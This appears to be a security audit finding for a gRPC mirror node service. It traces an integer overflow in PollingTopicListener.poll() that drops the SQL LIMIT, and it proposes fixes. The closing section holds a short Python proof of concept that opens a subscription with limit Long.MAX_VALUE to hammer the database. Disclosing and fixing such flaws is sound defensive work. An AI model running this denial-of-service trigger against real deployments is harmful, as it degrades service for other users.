Audit Report

## Title
Integer Overflow in `PollingTopicListener.poll()` Bypasses SQL LIMIT, Enabling Unbounded DB Queries via Large `limit` Value

## Summary
An unauthenticated gRPC client can submit a `ConsensusTopicQuery` with `limit` set to any value greater than `Integer.MAX_VALUE` (e.g., `Long.MAX_VALUE`). The narrowing cast `(int)(filter.getLimit() - context.getCount().get())` in `PollingTopicListener.poll()` overflows to `-1`. Because `TopicMessageFilter.hasLimit()` returns `false` for any non-positive value, the JPA query is issued with no `LIMIT` clause, causing every poll cycle to fetch all matching rows from the database — a resource-exhaustion DoS.

## Finding Description

**Step 1 — No upper-bound on `limit` at the entry point.**

`ConsensusController.toFilter()` copies the raw protobuf `uint64` field directly into the filter with no cap:

```java
final var filter = TopicMessageFilter.builder().limit(query.getLimit());
``` [1](#0-0) 

`TopicMessageFilter` only enforces `@Min(0)` on `limit` — there is no `@Max` constraint — so any value in `[1, Long.MAX_VALUE]` passes validation:

```java
@Min(0)
private long limit;
``` [2](#0-1) 

**Step 2 — Propagation through `incomingMessages()`.**

`TopicMessageServiceImpl.incomingMessages()` computes the residual limit as a `long` and passes it to the listener unchanged:

```java
long limit = filter.hasLimit() ? filter.getLimit() - topicContext.getCount().get() : 0;
var newFilter = filter.toBuilder().limit(limit).startTime(startTime).build();
return topicListener.listen(newFilter)...
``` [3](#0-2) 

With `filter.getLimit() = Long.MAX_VALUE` and `count = 0`, `newFilter.getLimit() = Long.MAX_VALUE`.

**Step 3 — Integer overflow in `PollingTopicListener.poll()`.**

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())   // ← overflow
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
...
var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
``` [4](#0-3) 

- `filter.hasLimit()` = `true` (since `Long.MAX_VALUE > 0`)
- `(int)(Long.MAX_VALUE - 0L)` = `(int)(0x7FFFFFFFFFFFFFFF)` = **`-1`**
- `Math.min(-1, 5000)` = **`-1`**
- `newFilter` is built with `limit = -1`

**Step 4 — SQL LIMIT silently dropped.**

`TopicMessageRepositoryCustomImpl.findByFilter()` guards `setMaxResults` with `hasLimit()`:

```java
if (filter.hasLimit()) {
    typedQuery.setMaxResults((int) filter.getLimit());
}
``` [5](#0-4) 

`hasLimit()` is defined as `return limit > 0;`: [6](#0-5) 

Since `limit = -1`, `hasLimit()` returns `false`, `setMaxResults` is never called, and the JPA query runs with **no SQL LIMIT**, returning every matching row.

**Step 5 — Subscription never self-terminates.**

```java
if (filter.hasLimit()) {
    flux = flux.take(filter.getLimit());   // take(Long.MAX_VALUE) ≈ infinite
}
``` [7](#0-6) 

`filter.getLimit() = Long.MAX_VALUE` and `hasLimit() = true`, so `flux.take(Long.MAX_VALUE)` is called — effectively unbounded.

## Impact Explanation
Every poll interval (default 500 ms, configurable via `hiero.mirror.grpc.listener.interval`) [8](#0-7) 
the mirror node issues a full, unlimited query against the `topic_message` table. On a busy topic with millions of messages this saturates database I/O, exhausts JPA/JDBC connection pool threads, and degrades or denies service for all other subscribers. The attacker's subscription also never self-terminates, holding a `boundedElastic` scheduler thread and a DB connection for the lifetime of the connection. Multiple concurrent such subscriptions compound the effect.

## Likelihood Explanation
The gRPC `subscribeTopic` endpoint is publicly reachable with no authentication. The protobuf `limit` field is a `uint64`; any gRPC client library can set it to `Long.MAX_VALUE` in a single line. The attack is trivially repeatable, requires no special knowledge of the system, and leaves no obvious error in logs (the query simply returns all rows). The only prerequisite is that the deployment uses `ListenerType.POLL`; `POLL` is a documented and supported mode alongside the default `REDIS`. [9](#0-8) 

## Recommendation
1. **Cap `limit` at the entry point.** In `ConsensusController.toFilter()`, clamp the incoming value to a safe maximum (e.g., `Math.min(query.getLimit(), MAX_ALLOWED_LIMIT)`) before building the filter.
2. **Use `Math.toIntExact()` or a safe cast in `poll()`.** Replace `(int)(filter.getLimit() - context.getCount().get())` with a checked conversion that throws or clamps on overflow, preventing the silent `-1` result.
3. **Add a `@Max` constraint to `TopicMessageFilter.limit`.** This provides a second layer of defense at the validation layer.
4. **Guard `setMaxResults` against negative values.** In `TopicMessageRepositoryCustomImpl.findByFilter()`, add `filter.getLimit() > 0` as an explicit guard independent of `hasLimit()`.

## Proof of Concept
```python
import grpc
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from com.hederahashgraph.api.proto.java import consensus_topic_query_pb2
from com.hederahashgraph.api.proto.java import basic_types_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_topic_query_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=1),
    limit=0x7FFFFFFFFFFFFFFF,  # Long.MAX_VALUE — triggers overflow
)

# Each response triggers an unlimited DB query every 500ms
for msg in stub.subscribeTopic(query):
    pass  # connection held indefinitely; DB hammered continuously
```

The `limit = Long.MAX_VALUE` value passes `@Min(0)` validation, propagates to `PollingTopicListener.poll()`, overflows to `-1` on the narrowing cast, and causes `findByFilter()` to issue an unlimited SQL query on every poll cycle.
